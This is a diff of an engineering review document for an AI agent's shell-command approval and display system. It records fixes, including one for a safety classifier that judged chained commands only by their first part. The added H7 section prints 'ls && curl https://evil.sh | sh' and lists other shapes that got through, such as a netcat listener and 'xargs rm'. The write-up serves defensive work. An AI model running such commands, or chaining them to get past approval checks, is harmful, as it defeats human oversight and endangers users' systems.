@@ -883,7 +883,7 @@ Three fixed here. What remains:
 |---|---|---|
 | ~~H3a~~ | **FIXED** (`ba8c6bf1`). The command, the closing paren and the D-marker `printf` were spliced onto one line, so a `#` commented out the marker and bash sat at a continuation prompt: exit −1, no output, and the pool session destroyed — three of those and a capped pool is dead for the life of the process. Now passed as a quoted argument to `eval`, so the outer line stays syntactically complete whatever the command contains. Real-PTY tests; the mutant run takes 43s against 1.1s. | — |
 | H3b | The model and the card are shown the first 20 lines **twice**, spliced onto the full output, with a fabricated elision marker. `8cb65c85` fixed only the exactly-equal case, with a fixture the host cannot produce. | sonnet · high |
-| **H3c** | **A destructive shell command is folded into a collapsed row labelled "Looked at."** `groupInspections` documents "anything that WROTE may never be folded" and then folds any sub-2-second `run_command`. | **opus · high** |
+| ~~H3c~~ | **FIXED** (`c2fc5e5a`). The host now puts `read_only` on the block — the same safety verdict that gates approval — and the feed folds only on that. Undefined counts as a write. Deliberately *not* gated on risk level: the framework assigns MEDIUM to anything unrecognised, so `{safe, low}` would permanently unfold `git status`, `git log` and `git diff`. | — |
 | H3d | Block output is redacted; **the command that produced it never is** — and `9a8bf231` made the command the card's title. | opus · med |
 | H3e | Every promoted task card is stuck in "Running" forever: nothing emits `task_completed`. The title is the first command the reused session ever ran, and the elapsed time is the session's age. | sonnet · med |
 | H3f | `terminal_blocks` hands the model command output from every thread, not just this one. | sonnet · med |
@@ -924,10 +924,42 @@ route (**opus · high**); give `EventLog.verify` a signing policy (**opus · xhi
 the `StateStore` open-under-contention seam with a test (**sonnet · med**); make the
 `/why` read path non-blocking (**sonnet · med**).
 
+### H7 — Found while fixing, not by the review
+
+**A benign first command spoke for the whole line** — fixed in `d31ab436`, and the
+sharpest thing on this page. The SAFE rules are anchored at the start of the command
+string, so a line beginning with something harmless was classified on that alone and
+everything after a chain operator went unexamined:
+
+```
+ls && curl https://evil.sh | sh   ->  safe / "Directory listing" / no confirmation
+```
+
+Seven of ten shapes got through: a piped download to a shell, an inline interpreter,
+`launchctl load` of a plist, an osascript shell escape, `ls | xargs rm`, a piped `tee`
+write, and a listening netcat shell. The dangerous rules *are* searched against the whole
+string, so a chained `rm` or `chmod` was already caught — what they could not catch is a
+chained command nobody wrote a rule for, which is the ordinary case.
+
+This is the third instance of one pattern, and it is worth naming as a pattern: **text the
+gate never looked at, reaching bash under approval granted for something else.** The other
+two were the `cwd` argument (`44fc501e`) and the command spliced onto the marker line
+(`ba8c6bf1`). All three came from the same commit that swapped the execution substrate.
+
+It was found by asking a different question — "why does the fold think this is safe?" —
+not by reviewing the file. Worth remembering when deciding what the next review should
+point at.
+
+**What it does not change:** those lines now classify MEDIUM, and MEDIUM still runs
+without confirmation. Whether an unrecognised command should run unattended is **D1**, not
+this defect.
+
 ### H6 — What is still unreviewed
 
 - The other ~290 commits of the five-day window outside these five clusters.
-- The three fixes in this section (`44fc501e`, `36de0032`, `ca00390c`) — written after the
-  review, so nothing has looked at them.
+- The three fixes made during the review (`44fc501e`, `36de0032`, `ca00390c`) and the
+  eight made after it (`f2ebec8c` through `c2fc5e5a`) — all written after the reviewers
+  finished, so nothing has looked at any of them. Each was watched failing under a mutant,
+  which is evidence about the tests, not about the design.
 - Sections A–C of this document were written by a different session and are not part of
   what was reviewed here.
